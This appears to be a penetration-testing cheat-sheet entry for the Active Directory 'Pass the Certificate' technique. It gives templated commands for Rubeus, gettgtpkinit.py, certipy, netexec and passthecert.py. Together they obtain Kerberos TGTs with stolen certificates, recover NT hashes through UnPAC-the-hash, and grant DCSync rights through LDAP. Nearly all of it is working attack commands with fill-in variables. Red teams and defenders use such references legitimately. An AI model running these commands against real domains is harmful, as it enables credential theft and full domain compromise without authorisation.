---
technique: Pass the Certificate
category: kerberos
targets: User, Computer
protocols: Kerberos, LDAP
remote_capable: true
tags: kerberos pass-the-certificate pkinit tgt certificate pfx adcs ad
---

# Pass the Certificate

Pass the Certificate is PKINIT-based pre-authentication using an X.509 certificate and its matching private key to obtain a Kerberos TGT. It is frequently used after Shadow Credentials, AD CS escalation, or Golden Certificate attacks. The certificate and private key pair can be supplied as a PFX export (with optional password), separate PEM files, or a base64-encoded PFX string.

## Windows

### Rubeus

#powershell #pkinit #pfx

Request a TGT using a base64-encoded PFX certificate with Rubeus.

```powershell title:"PKINIT TGT request via PFX certificate with Rubeus"
.\Rubeus.exe asktgt /user:"$target_samname" /certificate:"$b64_cert" /password:"$pfx_pass" /domain:"$domain" /dc:"$dc_fqdn" /show
```
<!-- cheat
import domain_ip
var target_samname
var b64_cert
var pfx_pass
var dc_fqdn
-->

## Linux

### gettgtpkinit.py (PFX)

#python #pkinit #pfx

Request a TGT via PKINIT using a PFX file with password.

```sh title:"PKINIT TGT request via PFX file with gettgtpkinit.py"
gettgtpkinit.py -cert-pfx "$pfx_file" -pfx-pass "$pfx_pass" "$domain/$target_samname" tgt.ccache
```
<!-- cheat
import domain_ip
var target_samname
var pfx_file
var pfx_pass
-->

### gettgtpkinit.py (PEM)

#python #pkinit #pem

Request a TGT via PKINIT using separate PEM certificate and private key files.

```sh title:"PKINIT TGT request via PEM cert and key with gettgtpkinit.py"
gettgtpkinit.py -cert-pem "$pem_cert" -key-pem "$pem_key" "$domain/$target_samname" tgt.ccache
```
<!-- cheat
import domain_ip
var target_samname
var pem_cert
var pem_key
-->

### certipy auth

#python #pkinit #pfx #unpac

Authenticate with a PFX certificate and automatically recover the NT hash via UnPAC-the-hash.

```sh title:"PKINIT auth with certipy, auto UnPAC to recover NT hash"
certipy auth -pfx "$pfx_file" -password "$pfx_pass" -dc-ip "$rhost_ip" -username "$user" -domain "$domain"
```
<!-- cheat
import domain_ip
import users
var pfx_file
var pfx_pass
-->

### netexec

#ldap #smb #certificate

Authenticate to a service using a PFX certificate via netexec.

```sh title:"Authenticate via PFX certificate with netexec"
nxc ldap "$rhost_ip" --pfx-cert "$pfx_file" --pfx-pass "$pfx_pass" -u "$user"
```
<!-- cheat
import domain_ip
import users
var pfx_file
var pfx_pass
-->

### Step 1: Extract certificate from PFX (certipy)

#python #ldap #dcsync #password-reset

Extract the certificate (without key) from the PFX into a PEM file for passthecert.py.

```sh title:"Extract cert from PFX via certipy"
certipy cert -pfx "$pfx_file" -nokey -out user.crt
```
<!-- cheat
var pfx_file
-->

### Step 2: Extract private key from PFX (certipy)

#python #ldap #dcsync #password-reset

Extract the private key (without cert) from the PFX into a PEM file for passthecert.py.

```sh title:"Extract key from PFX via certipy"
certipy cert -pfx "$pfx_file" -nocert -out user.key
```
<!-- cheat
var pfx_file
-->

### Step 3: Grant DCSync rights via LDAP (passthecert.py)

#python #ldap #dcsync #password-reset

Use the extracted certificate to perform LDAP operations such as granting DCSync rights.

```sh title:"Grant DCSync rights via certificate-based LDAP auth"
passthecert.py -action modify_user -crt user.crt -key user.key -domain "$domain" -dc-ip "$rhost_ip" -target "$target_samname" -elevate
```
<!-- cheat
import domain_ip
var target_samname
-->
